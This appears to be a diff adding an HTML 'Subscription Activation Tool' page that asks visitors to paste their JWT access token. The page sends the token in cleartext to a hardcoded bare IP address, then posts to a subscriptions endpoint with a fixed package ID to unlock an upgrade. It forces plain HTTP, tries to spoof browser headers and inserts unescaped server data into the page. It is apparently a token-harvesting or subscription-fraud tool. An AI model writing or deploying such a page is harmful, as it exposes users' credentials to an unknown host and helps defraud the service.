@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title>Subscription Activation Tool</title>
+    <style>
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+      body {
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+      }
+      .container {
+        background: white;
+        border-radius: 15px;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        padding: 30px;
+        max-width: 500px;
+        width: 100%;
+        text-align: center;
+      }
+      h1 {
+        color: #333;
+        margin-bottom: 10px;
+        font-size: 1.8em;
+      }
+      p {
+        color: #666;
+        margin-bottom: 20px;
+      }
+      input {
+        width: 100%;
+        padding: 12px;
+        border: 2px solid #ddd;
+        border-radius: 8px;
+        font-size: 14px;
+        margin-bottom: 15px;
+        transition: border-color 0.3s;
+      }
+      input:focus {
+        border-color: #667eea;
+        outline: none;
+      }
+      .button-group {
+        display: flex;
+        gap: 10px;
+        flex-wrap: wrap;
+        justify-content: center;
+      }
+      button {
+        padding: 12px 20px;
+        border: none;
+        border-radius: 8px;
+        font-size: 14px;
+        cursor: pointer;
+        transition: background 0.3s;
+        flex: 1;
+        min-width: 120px;
+      }
+      #activateBtn {
+        background: #667eea;
+        color: white;
+      }
+      #activateBtn:hover {
+        background: #5a67d8;
+      }
+      #activateBtn:disabled {
+        background: #a0aec0;
+        cursor: not-allowed;
+      }
+      #clearBtn {
+        background: #e2e8f0;
+        color: #4a5568;
+      }
+      #clearBtn:hover {
+        background: #cbd5e0;
+      }
+      .spinner {
+        border: 3px solid #f3f3f3;
+        border-top: 3px solid #667eea;
+        border-radius: 50%;
+        width: 20px;
+        height: 20px;
+        animation: spin 1s linear infinite;
+        margin: 0 auto 10px;
+        display: none;
+      }
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+      #result {
+        margin-top: 20px;
+        padding: 15px;
+        border-radius: 8px;
+        display: none;
+        text-align: left;
+        max-height: 300px;
+        overflow-y: auto;
+      }
+      .success {
+        background: #d4edda;
+        color: #155724;
+        border: 1px solid #c3e6cb;
+      }
+      .error {
+        background: #f8d7da;
+        color: #721c24;
+        border: 1px solid #f5c6cb;
+      }
+      pre {
+        background: #f8f9fa;
+        padding: 10px;
+        overflow: auto;
+        border-radius: 5px;
+        font-size: 12px;
+        margin-top: 10px;
+      }
+      details {
+        cursor: pointer;
+        margin-top: 10px;
+      }
+      a {
+        color: #667eea;
+        text-decoration: none;
+      }
+      a:hover {
+        text-decoration: underline;
+      }
+      @media (max-width: 480px) {
+        .container {
+          padding: 20px;
+        }
+        h1 {
+          font-size: 1.5em;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>Subscription Activation Tool</h1>
+      <p>
+        Enter your JWT (Access Token) and click Activate to upgrade your
+        subscription.
+      </p>
+
+      <input
+        type="text"
+        id="jwtInput"
+        placeholder="Paste your JWT here... (e.g., eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...)"
+        required
+      />
+      <div class="button-group">
+        <button id="activateBtn" onclick="activateSubscription()">
+          Activate
+        </button>
+        <button id="clearBtn" onclick="clearForm()">Clear</button>
+      </div>
+
+      <div class="spinner" id="spinner"></div>
+      <div id="result"></div>
+    </div>
+
+    <script>
+      // Simple JWT validation (checks structure)
+      function isValidJWT(token) {
+        const jwtRegex = /^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+$/;
+        return jwtRegex.test(token) && token.split(".").length === 3;
+      }
+
+      // Decode JWT payload
+      function decodeJWT(token) {
+        try {
+          const base64Url = token.split(".")[1];
+          const base64 = base64Url.replace(/-/g, "+").replace(/_/g, "/");
+          const jsonPayload = decodeURIComponent(
+            atob(base64)
+              .split("")
+              .map((c) => "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2))
+              .join("")
+          );
+          return JSON.parse(jsonPayload);
+        } catch (e) {
+          throw new Error("Invalid JWT payload: " + e.message);
+        }
+      }
+
+      // Show loading
+      function showLoading(show) {
+        document.getElementById("spinner").style.display = show
+          ? "block"
+          : "none";
+        document.getElementById("activateBtn").disabled = show;
+      }
+
+      // Show result
+      function showResult(message, type) {
+        const resultDiv = document.getElementById("result");
+        resultDiv.innerHTML = message;
+        resultDiv.className = type;
+        resultDiv.style.display = "block";
+        showLoading(false);
+      }
+
+      // Clear form
+      function clearForm() {
+        document.getElementById("jwtInput").value = "";
+        document.getElementById("result").style.display = "none";
+      }
+
+      // Main activation function
+      async function activateSubscription() {
+        if (window.location.protocol === "https:") {
+          showResult(
+            "Cannot make HTTP requests from an HTTPS page due to mixed content policy. Please serve this page over HTTP.",
+            "error"
+          );
+          return;
+        }
+        const jwt = document.getElementById("jwtInput").value.trim();
+        if (!jwt) {
+          showResult("Please enter a valid JWT!", "error");
+          return;
+        }
+        if (!isValidJWT(jwt)) {
+          showResult(
+            "Invalid JWT format! It should be a valid token string.",
+            "error"
+          );
+          return;
+        }
+
+        showLoading(true);
+        document.getElementById("result").style.display = "none";
+
+        try {
+          // Step 1: GET /v1/codes
+          const getResponse = await fetch("http://176.123.9.60:3000/v1/codes", {
+            method: "GET",
+            headers: {
+              Authorization: `Bearer ${jwt}`,
+              Accept: "application/json",
+              "User-Agent":
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
+              Origin: window.location.origin,
+              Referer: window.location.origin + "/",
+            },
+          });
+
+          if (!getResponse.ok) {
+            if (getResponse.status === 429)
+              throw new Error("Rate limit exceeded! Try again later.");
+            throw new Error(
+              `GET failed: ${getResponse.status} - ${getResponse.statusText}`
+            );
+          }
+
+          const getData = await getResponse.json();
+          if (!getData.success) {
+            throw new Error("GET response unsuccessful (success: false)");
+          }
+
+          // Decode the download token
+          const payload = decodeJWT(getData.token);
+          const code = payload.code.code;
+          const downloadToken = getData.token;
+          const downloadLink = payload.code.download_link || getData.uri;
+
+          // Step 2: POST /v1/subscriptions
+          const postBody = JSON.stringify({
+            bouquetId: 384,
+            code: code,
+            token: downloadToken,
+          });
+          const postResponse = await fetch(
+            "http://176.123.9.60:3000/v1/subscriptions",
+            {
+              method: "POST",
+              headers: {
+                Authorization: `Bearer ${jwt}`,
+                "Content-Type": "application/json",
+                Accept: "application/json",
+                "User-Agent":
+                  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
+                Origin: window.location.origin,
+                Referer: window.location.origin + "/",
+              },
+              body: postBody,
+            }
+          );
+
+          if (!postResponse.ok) {
+            if (postResponse.status === 429)
+              throw new Error("Rate limit exceeded on POST! Try again later.");
+            throw new Error(
+              `POST failed: ${postResponse.status} - ${postResponse.statusText}`
+            );
+          }
+
+          const postData = await postResponse.json();
+          const successMsg = `
+                    <strong>Activation Successful!</strong><br>
+                    Code: <strong>${code}</strong><br>
+                    Download Link: <a href="${downloadLink}" target="_blank">${downloadLink}</a><br>
+                    <details><summary>Full Response (click to expand)</summary>
+                    <pre>${JSON.stringify(postData, null, 2)}</pre>
+                    </details>
+                `;
+          showResult(successMsg, "success");
+        } catch (error) {
+          console.error("Activation error:", error);
+          const errorMsg = `<strong>Error:</strong> ${error.message}<br>Check console for details or try again.`;
+          showResult(errorMsg, "error");
+        }
+      }
+    </script>
+  </body>
+</html>
